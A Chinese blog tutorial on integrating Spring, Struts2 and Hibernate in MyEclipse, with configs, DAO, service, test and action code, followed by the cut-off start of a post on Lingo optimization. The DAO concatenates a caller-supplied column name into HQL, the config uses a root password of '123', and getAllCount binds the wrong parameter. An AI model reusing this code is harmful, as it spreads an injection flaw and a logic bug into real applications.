MyEclipse Hibernate Tools. --&gt;&lt;hibernate-configuration&gt; &lt;session-factory&gt; &lt;property name=\"dialect\"&gt;org.hibernate.dialect.MySQLDialect&lt;/property&gt; &lt;property name=\"show_sql\"&gt;true&lt;/property&gt; &lt;property name=\"format_sql\"&gt;true&lt;/property&gt; &lt;/session-factory&gt;&lt;/hibernate-configuration&gt; 1.3.2 建立一个database.properties文件，用于保存所有数据连接的信息123456789db.driver=com.mysql.cj.jdbc.Driverdb.url=jdbc:mysql://localhost:3306/test?useSSL=true&amp;serverTimezone=UTC&amp;useUnicode=true&amp;characterEncoding=UTF-8db.user=rootdb.password=123pool.max=1pool.min=1pool.init=10pool.idle=20 1.3.3 配置applicationContext.xml文件要想将Spring和Hibernate进行整合，那么就需要配置applicationContext.xml文件，以下是常用的配置步骤，每个步骤分别对应后面的代码。 在namespace中勾上context，用于添加Annotation支持 添加支持Annotation 通过classpath加载databasse.properties文件 配置数据库连接池 配置Hibernate的相关环境，SessionFactory可以打开Session 事务配置的声明 定义事务的切入点 添加支持Annotation 123&lt;!-- 配置annotation的支持操作 --&gt; &lt;context:annotation-config/&gt; &lt;context:component-scan base-package=\"com.tianxingjian\"/&gt; 通过classpath加载databasse.properties文件 12&lt;!-- 在本程序中设置要导入的资源文件路径，直接通过classpath加载 --&gt; &lt;context:property-placeholder location=\"classpath:database.properties\"/&gt; 配置数据库连接池 1234567891011&lt;!-- 配合数据库连接池 --&gt; &lt;bean id=\"dataSource\" class=\"com.mchange.v2.c3p0.ComboPooledDataSource\"&gt; &lt;property name=\"driverClass\" value=\"$&#123;db.driver&#125;\"/&gt; &lt;property name=\"jdbcUrl\" value=\"$&#123;db.url&#125;\"/&gt; &lt;property name=\"user\" value=\"$&#123;db.user&#125;\"/&gt; &lt;property name=\"password\" value=\"$&#123;db.password&#125;\"/&gt; &lt;property name=\"maxPoolSize\" value=\"$&#123;pool.max&#125;\"/&gt; &lt;property name=\"minPoolSize\" value=\"$&#123;pool.min&#125;\"/&gt; &lt;property name=\"initialPoolSize\" value=\"$&#123;pool.init&#125;\"/&gt; &lt;property name=\"maxIdleTime\" value=\"$&#123;pool.idle&#125;\"/&gt; &lt;/bean&gt; 配置Hibernate的相关环境，SessionFactory可以打开Session 123456789&lt;!-- 配置Hibernate的相关环境，SessionFactory可以打开Session --&gt; &lt;bean id=\"sessionFactory\" class=\"org.springframework.orm.hibernate4.LocalSessionFactoryBean\"&gt; &lt;property name=\"configLocation\" value=\"classpath:hibernate.cfg.xml\"&gt; &lt;/property&gt; &lt;!-- 就表示这个项目里面引用数据源关系 --&gt; &lt;property name=\"dataSource\" ref=\"dataSource\"/&gt; &lt;/bean&gt; 事务的配置声明 123456789101112131415161718&lt;!-- 事务的配置声明 --&gt; &lt;tx:annotation-driven transaction-manager=\"transactionManager\" /&gt; &lt;tx:advice id=\"txAdvice\" transaction-manager=\"transactionManager\"&gt; &lt;!-- 定义一切与服务层有关的方法名称，只要是使用了特定的名称那么就会自动进行处理事务 --&gt; &lt;tx:attributes&gt; &lt;tx:method name=\"insert*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"update*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"delete*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"add*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"edit*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"change*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"login*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"get*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;tx:method name=\"load*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;tx:method name=\"list*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;tx:method name=\"*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;/tx:attributes&gt; &lt;/tx:advice&gt; 定义事务的切入点 12345&lt;!-- 定义事务的切入点 --&gt; &lt;aop:config expose-proxy=\"true\"&gt; &lt;aop:pointcut expression=\"execution(* com.tianxingjian..service.*.*(..))\" id=\"pointcut\"/&gt; &lt;aop:advisor advice-ref=\"txAdvice\" pointcut-ref=\"pointcut\"/&gt; &lt;/aop:config&gt; _以上就是本次项目中applicationContext.xml文件的相关配置，完整的applicationContext.xml文件的代码如下：_ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:p=\"http://www.springframework.org/schema/p\" xmlns:tx=\"http://www.springframework.org/schema/tx\" xmlns:context=\"http://www.springframework.org/schema/context\" xmlns:aop=\"http://www.springframework.org/schema/aop\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.1.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.1.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.1.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd\"&gt; &lt;!-- 配置annotation的支持操作 --&gt; &lt;context:annotation-config/&gt; &lt;context:component-scan base-package=\"com.tianxingjian\"/&gt; &lt;!-- 在本程序中设置要导入的资源文件路径，直接通过classpath加载 --&gt; &lt;context:property-placeholder location=\"classpath:database.properties\"/&gt; &lt;!-- 配合数据库连接池 --&gt; &lt;bean id=\"dataSource\" class=\"com.mchange.v2.c3p0.ComboPooledDataSource\"&gt; &lt;property name=\"driverClass\" value=\"$&#123;db.driver&#125;\"/&gt; &lt;property name=\"jdbcUrl\" value=\"$&#123;db.url&#125;\"/&gt; &lt;property name=\"user\" value=\"$&#123;db.user&#125;\"/&gt; &lt;property name=\"password\" value=\"$&#123;db.password&#125;\"/&gt; &lt;property name=\"maxPoolSize\" value=\"$&#123;pool.max&#125;\"/&gt; &lt;property name=\"minPoolSize\" value=\"$&#123;pool.min&#125;\"/&gt; &lt;property name=\"initialPoolSize\" value=\"$&#123;pool.init&#125;\"/&gt; &lt;property name=\"maxIdleTime\" value=\"$&#123;pool.idle&#125;\"/&gt; &lt;/bean&gt; &lt;!-- 配置Hibernate的相关环境，SessionFactory可以打开Session --&gt; &lt;bean id=\"sessionFactory\" class=\"org.springframework.orm.hibernate4.LocalSessionFactoryBean\"&gt; &lt;property name=\"configLocation\" value=\"classpath:hibernate.cfg.xml\"&gt; &lt;/property&gt; &lt;!-- 就表示这个项目里面引用数据源关系 --&gt; &lt;property name=\"dataSource\" ref=\"dataSource\"/&gt; &lt;/bean&gt; &lt;!-- 配置事务处理，所有的事务都采用AOP的方式，本处只声明SessionFactory要进行事务处控制--&gt; &lt;bean id=\"transactionManager\" class=\"org.springframework.orm.hibernate4.HibernateTransactionManager\"&gt; &lt;property name=\"sessionFactory\" ref=\"sessionFactory\" /&gt; &lt;/bean&gt; &lt;!-- 事务的配置声明 --&gt; &lt;tx:annotation-driven transaction-manager=\"transactionManager\" /&gt; &lt;tx:advice id=\"txAdvice\" transaction-manager=\"transactionManager\"&gt; &lt;!-- 定义一切与服务层有关的方法名称，只要是使用了特定的名称那么就会自动进行处理事务 --&gt; &lt;tx:attributes&gt; &lt;tx:method name=\"insert*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"update*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"delete*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"add*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"edit*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"change*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"login*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"get*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;tx:method name=\"load*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;tx:method name=\"list*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;tx:method name=\"*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;/tx:attributes&gt; &lt;/tx:advice&gt; &lt;!-- 定义事务的切入点 --&gt; &lt;aop:config expose-proxy=\"true\"&gt; &lt;aop:pointcut expression=\"execution(* com.tianxingjian..service.*.*(..))\" id=\"pointcut\"/&gt; &lt;aop:advisor advice-ref=\"txAdvice\" pointcut-ref=\"pointcut\"/&gt; &lt;/aop:config&gt;&lt;/beans&gt; 2. 编写src代码用于本次测试2.1 生成News.java的POJO类我们利用Annotation的注解方式完成： windows -&gt; perspetive -&gt; open perspective -&gt; database explore -&gt; 右键mysql -&gt; 连接 找到要处理的表 -&gt; 右键Hibernate reverse -&gt; src为项目的src路径，java package一般为com.tianxingjian.pojo -&gt; √create pojo -&gt; 点击add Hibernate mapping annotations to pojo -&gt; next -&gt; id generator -&gt; native -&gt; next -&gt; 点击表然后native -&gt; finish，生成pojo的时候最好把create abstract class取消掉，生成之后为了便于之后的JUnit测试加上toString方法，完整的News.java代码如下：上述操作完成之后pojo类的映射操作将自动保存在hibernate.cfg.xml文件中，代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889package com.tianxingjian.pojo;import java.util.Date;import javax.persistence.Column;import javax.persistence.Entity;import javax.persistence.GeneratedValue;import javax.persistence.Id;import javax.persistence.Table;import javax.persistence.Temporal;import javax.persistence.TemporalType;/** * News entity. @author MyEclipse Persistence Tools */@Entity@Table(name = \"news\", catalog = \"news_db\")public class News implements java.io.Serializable &#123; // Fields private Integer nid; private String title; private Date date; private String content; // Constructors /** default constructor */ public News() &#123; &#125; /** full constructor */ public News(String title, Date date, String content) &#123; this.title = title; this.date = date; this.content = content; &#125; // Property accessors @Id @GeneratedValue @Column(name = \"nid\", unique = true, nullable = false) public Integer getNid() &#123; return this.nid; &#125; public void setNid(Integer nid) &#123; this.nid = nid; &#125; @Column(name = \"title\", length = 100) public String getTitle() &#123; return this.title; &#125; public void setTitle(String title) &#123; this.title = title; &#125; @Temporal(TemporalType.DATE) @Column(name = \"date\", length = 10) public Date getDate() &#123; return this.date; &#125; public void setDate(Date date) &#123; this.date = date; &#125; @Column(name = \"content\", length = 100) public String getContent() &#123; return this.content; &#125; public void setContent(String content) &#123; this.content = content; &#125; @Override public String toString() &#123; return \"News [nid=\" + nid + \", title=\" + title + \", date=\" + date + \", content=\" + content + \"]\\n\"; &#125;&#125; 1&lt;mapping class=\"com.tianxingjian.pojo.News\" /&gt; 2.2 定义INewsDAO.java接口123456789101112131415package com.tianxingjian.dao;import java.util.List;import java.util.Set;import com.tianxingjian.pojo.News;public interface INewsDAO &#123; public boolean doCreate(News vo) throws Exception; public boolean doUpdate(News vo) throws Exception; public News getElementById(Integer id) throws Exception; public boolean doRemoveBatch(Set&lt;Integer&gt; ids) throws Exception; public List&lt;News&gt; findAll() throws Exception; public List&lt;News&gt; findAllSplit(String column, String keyWord, Integer currentPage, Integer lineSize) throws Exception; public Integer getAllCount(String column, String keyWord) throws Exception;&#125; 2.2 实现NewsDAOImpl.java类12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879package com.tianxingjian.dao.impl;import java.util.Iterator;import java.util.List;import java.util.Set;import javax.annotation.Resource;import org.hibernate.Criteria;import org.hibernate.Query;import org.hibernate.SessionFactory;import org.springframework.stereotype.Component;import com.tianxingjian.dao.INewsDAO;import com.tianxingjian.pojo.News;@Componentpublic class NewsDAOImpl implements INewsDAO &#123; @Resource private SessionFactory sessionFactory; @Override public boolean doCreate(News vo) throws Exception &#123; return sessionFactory.getCurrentSession().save(vo) != null; &#125; @Override public boolean doUpdate(News vo) throws Exception &#123; String hql = \"update News set title=?, date=?, content=? where nid=?\"; Query query = this.sessionFactory.getCurrentSession().createQuery(hql); query.setParameter(0, vo.getTitle()); query.setParameter(1, vo.getDate()); query.setParameter(2, vo.getContent()); query.setParameter(3, vo.getNid()); return query.executeUpdate() &gt; 0; &#125; @Override public News getElementById(Integer id) throws Exception &#123; return (News) this.sessionFactory.getCurrentSession().get(News.class, id); &#125; @Override public boolean doRemoveBatch(Set&lt;Integer&gt; ids) throws Exception &#123; StringBuffer buffer = new StringBuffer(); buffer.append(\"delete from News where nid in (\"); Iterator&lt;Integer&gt; iterator = ids.iterator(); while (iterator.hasNext()) &#123; buffer.append(iterator.next()).append(\",\"); &#125; buffer.delete(buffer.length()-1, buffer.length()).append(\")\"); Query query = this.sessionFactory.getCurrentSession().createQuery(buffer.toString()); return query.executeUpdate() &gt; 0; &#125; @SuppressWarnings(\"unchecked\") @Override public List&lt;News&gt; findAll() throws Exception &#123; Criteria criteria = this.sessionFactory.getCurrentSession().createCriteria(News.class); return criteria.list(); &#125; @SuppressWarnings(\"unchecked\") @Override public List&lt;News&gt; findAllSplit(String column, String keyWord, Integer currentPage, Integer lineSize) throws Exception &#123; String hql = \"from News as n where n.\" + column + \" like ?\"; Query query = this.sessionFactory.getCurrentSession().createQuery(hql); query.setParameter(0, \"%\" + keyWord + \"%\"); query.setFirstResult((currentPage-1)*lineSize); query.setMaxResults(lineSize); return query.list(); &#125; @Override public Integer getAllCount(String column, String keyWord) throws Exception &#123; String hql = \"select count(*) from News as n where n.\" + column + \" like ?\"; Query query = this.sessionFactory.getCurrentSession().createQuery(hql); query.setParameter(0, \"%\" + column + \"%\"); Long count = (Long) query.uniqueResult(); return count.intValue(); &#125;&#125; 2.3 定义业务层INewsService.java接口12345678910111213141516package com.tianxingjian.service;import java.util.List;import java.util.Map;import java.util.Set;import com.tianxingjian.pojo.News;public interface INewsService &#123; public boolean insert(News vo) throws Exception; public boolean update(News vo) throws Exception; public News get(Integer id) throws Exception; public boolean delete(Set&lt;Integer&gt; ids) throws Exception; public List&lt;News&gt; list() throws Exception; public Map&lt;String, Object&gt; list(String column, String keyWord, Integer currentPage, Integer lineSize) throws Exception;&#125; 2.4 编写测试程序，用JUnit 点击IServiceImpl 点击MyEclipse右上角的New图标 查询Junit Test Case 将package改为com.tianxingjian.test -&gt; next 全选 -&gt; finish 使用JUnit进行单个方法的测试： 选中需要测试的类 把类进行展开 把C进行展开 就可以看到测试类中所有的方法 点击所需要运行的测试方法然后右键junit运行就行了 _注意: 在写hql语句的时候表名应该大写表示对象而不是小写，如下所示_ 12String hql = \"update News set title=?,date=?,content=? where nid=?\"; // 正确String hql = \"update news set title=?,date=?,content=? where nid=?\"; // 错误 完整JUnit测试代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798package com.tianxingjian.test;import static org.junit.Assert.*;import java.util.Date;import java.util.HashSet;import java.util.Set;import org.junit.Test;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;import org.springframework.stereotype.Service;import com.tianxingjian.pojo.News;import com.tianxingjian.service.INewsService;import junit.framework.TestCase;public class INewsServiceTest &#123; public static ApplicationContext ctx; static &#123; ctx = new ClassPathXmlApplicationContext(\"applicationContext.xml\"); &#125; @Test public void testInsert() &#123; INewsService service = ctx.getBean(\"newsServiceImpl\", INewsService.class); News vo = new News(); vo.setTitle(\"SSH整合了-\" + System.currentTimeMillis()); vo.setDate(new Date()); vo.setContent(\"SSH内容很丰富！\"); try &#123; TestCase.assertEquals(service.insert(vo), true); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; @Test public void testUpdate() &#123; INewsService service = ctx.getBean(\"newsServiceImpl\", INewsService.class); News vo = new News(); vo.setNid(5); vo.setTitle(\"准备开始学习了！\"); vo.setDate(new Date()); vo.setContent(\"你高兴么！\"); try &#123; TestCase.assertEquals(service.update(vo), true); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; @Test public void testGet() &#123; INewsService service = ctx.getBean(\"newsServiceImpl\", INewsService.class); try &#123; System.out.println(service.get(1)); &#125; catch (Exception e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125; @Test public void testDelete() &#123; INewsService service = ctx.getBean(\"newsServiceImpl\", INewsService.class); Set&lt;Integer&gt; set = new HashSet&lt;Integer&gt;(); set.add(5); set.add(4); try &#123; TestCase.assertEquals(service.delete(set), true); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; @Test public void testList() &#123; INewsService service = ctx.getBean(\"newsServiceImpl\", INewsService.class); try &#123; System.out.println(service.list()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; @Test public void testListStringStringIntegerInteger() &#123; INewsService service = ctx.getBean(\"newsServiceImpl\", INewsService.class); try &#123; System.out.println(service.list(\"title\", \"\", 1, 3)); &#125; catch (Exception e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125;&#125; 3.将Spring和Struts2.x进行整合3.1 添加Struts2.x的支持 install Struts2.x facet -&gt; next -&gt; next -&gt; √ Spring Plugin -&gt; finish 3.2 为Spring添加监听器，即可在web中使用 监听器名称：org.springframework.web.context.ContextLoderListen 3.2.1 在web.xml文件中添加监听器（MyEclipse会自动添加）123&lt;listener&gt; &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt; &lt;/listener&gt; 3.2.2 在web.xml文件中将applicationContext.xml里的配置设置到Web环境之中,将路径的信息设置为applicationContext.xml属性范围（MyEclipse会自动进行配置）1234&lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:applicationContext.xml&lt;/param-value&gt; &lt;/context-param&gt; 3.3 进行Struts的相关配置3.3.1 建立struts.properties文件，这个文件是用于设置对象工厂123struts.i18n.encoding=UTF-8struts.custom.i118n.resource=Messages,Pagesstruts.objectFactory=spring 3.1.2 修改struts.xml文件本次只是将SSH进行整合，所以只是简单的配置了name、namespace和extends，在实际开发中，需要在package里进行相关跳转路径的配置 123&lt;package name=\"root\" namespace=\"/\" extends=\"struts-default\"&gt; &lt;/package&gt; 3.1.3 编写NewsAction.java程序，用于进行相关的业务操作NewsAction.java的完整代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687package com.tianxingjian.action;import java.util.HashSet;import java.util.Set;import javax.annotation.Resource;import org.apache.struts2.ServletActionContext;import org.apache.struts2.convention.annotation.Action;import org.apache.struts2.convention.annotation.Namespace;import org.apache.struts2.convention.annotation.ParentPackage;import org.springframework.stereotype.Repository;import com.opensymphony.xwork2.ActionSupport;import com.tianxingjian.pojo.News;import com.tianxingjian.service.INewsService;@Repository@ParentPackage(\"root\")@Namespace(\"/pages/news\")@Action(value=\"NewsAction\")@SuppressWarnings(\"serial\")public class NewsAction extends ActionSupport&#123; @Resource private INewsService newsService; private News news = new News(); public News getNews() &#123; return news; &#125; public void insert() &#123; System.out.println(\"【新闻数据增加】数据\" + this.news); try &#123; System.out.println(\"【新闻数据增加】业务调用结果\" + this.newsService.insert(this.news)); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public void update() &#123; System.out.println(\"【新闻数据修改】数据\" + this.news); try &#123; System.out.println(\"【新闻数据修改】业务调用结果\" + this.newsService.update(this.news)); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public void delete() &#123; String ids = ServletActionContext.getRequest().getParameter(\"ids\"); System.out.println(\"【新闻数据删除】数据\" + ids); try &#123; Set&lt;Integer&gt; set = new HashSet&lt;Integer&gt;(); String result [] = ids.split(\"_\"); for (int x=0; x&lt;result.length; x++) &#123; set.add(Integer.parseInt(result[x])); &#125; System.out.println(\"【新闻数据删除】业务调用结果\" + this.newsService.delete(set)); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public void get() &#123; System.out.println(\"【新闻数据取得】数据\" + this.news); try &#123; System.out.println(\"【新闻数据取得】业务调用结果：\" + this.newsService.get(this.news.getNid())); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public void list() &#123; System.out.println(\"【新闻数据查询】数据\" + this.news); try &#123; System.out.println(\"【新闻数据查询】业务调用结果：\" + this.newsService.list()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public void listSplit() &#123; System.out.println(\"【新闻数据查询】数据\" + this.news); try &#123; System.out.println(\"【新闻数据查询】业务调用结果：\" + this.newsService.list(\"title\", \"\", 1, 3)); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 3.1.4 启动Tomcat并进行测试（测试时在地址上进行传参） 启动Tomcat 访问地址： 添加地址：http://localhost:8080/SSHDemo/pages/news/NewsAction!insert.action?news.title=&quot;今天好心情！&quot;&amp;news.content=&quot;是的呢！今天好心情啊！！！“ 更新地址：http://localhost:8080/SSHDemo/pages/news/NewsAction!update.action?news.nid=5&amp;news.title=&quot;今天好心情！&quot;&amp;news.content=&quot;是的呢！今天好心情啊！！！“ 删除地址：http://localhost:8080/SSHDemo/pages/news/NewsAction!delete.action?ids=&quot;6_7“ 查询全部：http://localhost:8080/SSHDemo/pages/news/NewsAction!list.action 分页查询：http://localhost:8080/SSHDemo/pages/news/NewsAction!listSplit.action 根据id查询：http://localhost:8080/SSHDemo/pages/news/NewsAction!get.action?news.nid=6 _在运行的时候有可能会出现以下几个错误：_ java.lang.NoSuchMethodError:antlr.collections.AST.getLine()_**解决方案：这个错误的产生原因是Hibernate和Struts中都存在antrl的文件，只需要将低版本的jar文件进行移除就可以了。操作：window -&gt; preference -&gt; lib -&gt; struts2.1 -&gt; core -&gt; 取消antrl的jar文件 -&gt; apply -&gt; 出来后重新刷新如果依然有错就将strutss2进行remove build path然后重新添加 Caused by: java.lang.ClassNotFoundException: com.mchange.v2.ser.Indirector解决方案：在官网下载一个mchange-commons-java的jar文件，然后build path并添加到lib中，这样就能配置到项目中了，错误也就消失了，想这种错误都是缺少jar包，只需要下载并配置即可解决 4. HibernateDaoSupport支持类 以上实现的SSH整合是在Spring3.x被迫形成的，因为从最早的Spring2和现在的Spring4都会提供一个HibernateDaoSupport类，利用这个类结合HibernateTemplate操作模板就可以轻松地实现，HibernateDaoSupport类里面提供的一系列的操作方法还可以简化Hibernate的编写难度。 在org.springframework.orm.hibernate4.support.HibernateDaoSupport里提供有如下方法： |- 构造方法：public HibernateDaoSupport(); |- 设置Hibernate操作模板：public final void setHibernateTemplate(HibernateTemplate hibernateTemplate); |- 取得Hibernate操作模板：public final HibernateTemplate getHibernateTemplate(); 如果要想使用这个操作则需要清楚HibernateTemplate的定义，有如下一些方法： |- 构造方法：public HibernateTemplate(); |- 设置SessionFactory：public void setSessionFactory(SessionFactory sessionFactory); 同时在HibernateTemplate中提供有一些列的简化Hibernate操作的方法。 4.1 利用HibernateDaoSupport实现操作4.1.1 修改applicationContext.xml文件123&lt;bean id=\"hibernateTemplate\" class=\"org.springframework.orm.hibernate4.HibernateTemplate\"&gt; &lt;property name=\"sessionFactory\" ref=\"sessionFactory\"/&gt;&lt;/bean&gt; 4.1.2 定义NewsDaoImpl子类的时候使用这个操作 extends HibernateDaoSupport 不再使用SessionFactory，而是使用HibernateTemplate 1234567@Autowired public NewsDAOImpl(HibernateTemplate ht) &#123; super.setHibernateTemplate(ht); &#125; // @Resource// private SessionFactory sessionFactory; 然后将处理方法中的this.sessionFactory改为super.getHibernateTemplate…… 更改后的NewsDaoImpl.java类如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596package com.tianxingjian.dao.impl;import java.util.Iterator;import java.util.List;import java.util.Set;import org.hibernate.Query;import org.hibernate.criterion.DetachedCriteria;import org.hibernate.criterion.Restrictions;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.orm.hibernate4.HibernateTemplate;import org.springframework.orm.hibernate4.support.HibernateDaoSupport;import org.springframework.stereotype.Component;import com.tianxingjian.dao.INewsDAO;import com.tianxingjian.pojo.News;@Componentpublic class NewsDAOImpl extends HibernateDaoSupport implements INewsDAO &#123; @Autowired public NewsDAOImpl(HibernateTemplate ht) &#123; super.setHibernateTemplate(ht); &#125; // @Resource// private SessionFactory sessionFactory; @Override public boolean doCreate(News vo) throws Exception &#123; return super.getHibernateTemplate().save(vo) != null;// return sessionFactory.getCurrentSession().save(vo) != null; &#125; @Override public boolean doUpdate(News vo) throws Exception &#123; String hql = \"update News set title=?, date=?, content=? where nid=?\";// Query query = super.getHibernateTemplate().createQuery(hql); Query query = super.getHibernateTemplate().getSessionFactory().getCurrentSession().createQuery(hql); query.setParameter(0, vo.getTitle()); query.setParameter(1, vo.getDate()); query.setParameter(2, vo.getContent()); query.setParameter(3, vo.getNid()); return query.executeUpdate() &gt; 0; &#125; @Override public News getElementById(Integer id) throws Exception &#123; return super.getHibernateTemplate().get(News.class, id);// return (News) this.sessionFactory.getCurrentSession().get(News.class, id); &#125; @Override public boolean doRemoveBatch(Set&lt;Integer&gt; ids) throws Exception &#123; StringBuffer buffer = new StringBuffer(); buffer.append(\"delete from News where nid in (\"); Iterator&lt;Integer&gt; iterator = ids.iterator(); while (iterator.hasNext()) &#123; buffer.append(iterator.next()).append(\",\"); &#125; buffer.delete(buffer.length()-1, buffer.length()).append(\")\"); Query query = super.getHibernateTemplate().getSessionFactory().getCurrentSession().createQuery(buffer.toString());// Query query = this.sessionFactory.getCurrentSession().createQuery(buffer.toString()); return query.executeUpdate() &gt; 0; &#125; @SuppressWarnings(\"unchecked\") @Override public List findAll() throws Exception &#123; DetachedCriteria dc = DetachedCriteria.forClass(News.class); return super.getHibernateTemplate().findByCriteria(dc);// Criteria criteria = this.sessionFactory.getCurrentSession().createCriteria(News.class);// return criteria.list(); &#125; @SuppressWarnings(\"unchecked\") @Override public List findAllSplit(String column, String keyWord, Integer currentPage, Integer lineSize) throws Exception &#123; DetachedCriteria dc = DetachedCriteria.forClass(News.class); dc.add(Restrictions.ilike(column, \"%\" + keyWord + \"%\")); return super.getHibernateTemplate().findByCriteria(dc, (currentPage-1)*lineSize, lineSize);// String hql = \"from News as n where n.\" + column + \" like ?\";// Query query = this.sessionFactory.getCurrentSession().createQuery(hql);// query.setParameter(0, \"%\" + keyWord + \"%\");// query.setFirstResult((currentPage-1)*lineSize);// query.setMaxResults(lineSize);// return query.list(); &#125; @Override public Integer getAllCount(String column, String keyWord) throws Exception &#123; String hql = \"select count(*) from News as n where n.\" + column + \" like ?\"; Long count = (Long) super.getHibernateTemplate().find(hql, \"%\" + keyWord + \"%\").get(0);// Query query = this.sessionFactory.getCurrentSession().createQuery(hql);// query.setParameter(0, \"%\" + column + \"%\");// Long count = (Long) query.uniqueResult(); return count.intValue(); &#125;&#125; 4.2 HibernateDaoSupport使用总结 使用HibernateDaoSupport的时候感觉似乎也并没有简单什么， 以上是两种操作方式，分别是使用SessionFactory和HibernateDaoSupport，这两个种基本都差不多，即在实际开发中这两种方法可根据自己的喜好来使用。 5. 使用MyEclipse进行SSH项目整合总结 以上便是此次利用MyEclipse进行SSH项目整合总结，感觉今天的学习效率很低，一天下来只是学了这个部分的内容，而且并不是说今天之后就被完全吸收，在之后的学习过程中还是需要不断的进行反反复复的温习。 学习时间：2018-07-17","path":"2018/09/20/利用MyEclipse进行SSH项目整合/"},{"title":"Lingo解决优化问题","text":"前言前面，我们已经对Lingo有了一定的了解，但是要想真正的熟悉Lingo在解决优化问题中的强大之处，还需要不断加强相关训练，本文主要是使用Lingo来解决优化问题，该文的主要目的有以下三点： 希望能够提升自己对Lingo的相关操作并加强对优化问题的思维模式 方便日后对Lingo核心操作的回顾 希望每一位到来的朋友能够有所收获 若您对Lingo的安装及基本操作不是很了解，可暂且移步：Lingo安装、Lingo基本操作 优化模型介绍优化模型主要有三个基本要素：决策变量、目标函数、约束条件。其一般形式如下： opt \\ \\ \\ \\ f(x) \\\\ s.t \\ \\ \\ \\ h_i(x)=0,\\ i=1,2,\\cdots,m \\\\ g_j(x)\\leq0,\\ j=1,2,\\cdots,l$opt$ 是“optimize”的缩写，表示“最优化”，一般为 $min$ 或 $max$，$f(x)$ 表示目标函数，$s.t.$ 是“subject to”的缩写“受约束于”，$h_i(x), g_i(x)$ 则表示约束条件，其中 $x$ 表示优化模型的决策变量。 运输问题问题描述 Question：有三个生产地和四个销售地，其生产量、销售量及单位运费如表所示，求总运费最少的运输方案以及总运费。 问题分析由题意，我们不难看出优化模型的决策变量是每个生产地向各个销售地运输的货量，即 $s_{ij}$。运输的总费用由各个产地向各个销售地运输所需费用之和，一个产地可以向多个销售地运输货物，一个销售地亦可接受多个产地的货物，所以可知优化模型中的目标函数是运输的总费用，即 $W=\\sum^3_{i=1}\\sum^4_{j=1}s_{ij}x_{ij}$。除此之外，该目标函数受到两个限制，即优化模型的约束条件： 生产地限制：每个生产地的运输量理应小于产生量，$\\sum_{j=1}^4s_{ij}\\leq a_i$ 销售地限制：每个销售地接受的货物理应等于销售量，$\\sum_{i=1}^3x_{ij}=b_j$ 优化模型构建有以上问题分析，为求出总运费最小的方案，我们可以构建该问题的优化模型如下： min \\ \\ \\ \\ \\sum^3_{i=1}\\sum^4_{j=1}s_{ij}x_{ij} \\\\ s.t. \\ \\ \\ \\ \\sum_{j=1}^4s_{ij}\\leq a_i \\;;\\ \\sum_{i=1}^3x_{ij}=b_j \\ ;\\ s_{ij}\\geq0 \\ ;模型求解求解的Lingo代码如下： 1234567891011121314151617sets:supply/1..3/: a;demand/1..4/: b;link(supply, demand): c, x;endsetsdata:a = 30,25,21;b = 15,17,22,12;c = 6,2,6,7, 4,9,5,3, 8,8,1,5;enddatamin = @sum(link(i,j): c(i,j) * x(i,j));@for(supply(i): @sum(demand(j): 